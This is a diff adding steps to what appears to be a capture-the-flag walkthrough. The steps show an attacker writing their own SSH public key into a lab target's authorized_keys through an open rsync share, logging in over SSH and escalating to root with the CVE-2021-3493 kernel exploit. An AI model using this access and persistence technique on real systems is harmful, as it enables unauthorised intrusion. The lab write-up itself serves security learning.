@@ -218,3 +218,33 @@ ls -Ra (to recursively list)
 
 ![image](https://user-images.githubusercontent.com/68326057/117246522-6cc3e800-ae5a-11eb-887d-5ea486d115f9.png)
 
+# Firefox(Rabbit hole)
+
+![image](https://user-images.githubusercontent.com/68326057/117249771-c7137780-ae5f-11eb-9049-62e31501660c.png)
+
+![image](https://user-images.githubusercontent.com/68326057/117249805-d4306680-ae5f-11eb-91f1-49206a356d49.png)
+
+
+```bash
+BASH ($) rsync -av /home/kalikali/.ssh/id_rsa.pub   rsync://rsync-connect@10.10.139.81/files/sys-internal/.ssh/authorized_keys                                                                                                               
+Password:                                                                                                                              
+sending incremental file list                                                                                                          
+id_rsa.pub
+
+sent 683 bytes  received 35 bytes  53.19 bytes/sec
+total size is 567  speedup is 0.79
+```
+
+```bash
+ssh -i ~/.ssh/id_rsa.pub sys-internal@10.10.139.81
+```
+
+![image](https://user-images.githubusercontent.com/68326057/117257649-c1bb2a80-ae69-11eb-968b-1cc38cc9d4d7.png)
+
+
+# root
+
+(+) exploit --> CVE-2021-3493-kernel
+
+![image](https://user-images.githubusercontent.com/68326057/117257614-b5cf6880-ae69-11eb-9e4b-54e5fa8f0d56.png)
+
